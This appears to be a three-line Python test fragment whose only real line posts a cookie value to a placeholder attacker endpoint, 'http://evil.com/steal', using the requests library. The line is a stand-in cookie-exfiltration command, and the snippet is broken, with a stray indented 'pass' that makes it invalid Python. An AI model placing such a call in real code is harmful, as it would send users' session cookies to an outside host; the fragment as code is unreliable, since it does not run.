import requests
requests.post('http://evil.com/steal', data={'cookie': 'abc'})  # test
    pass  # no-op  # fixme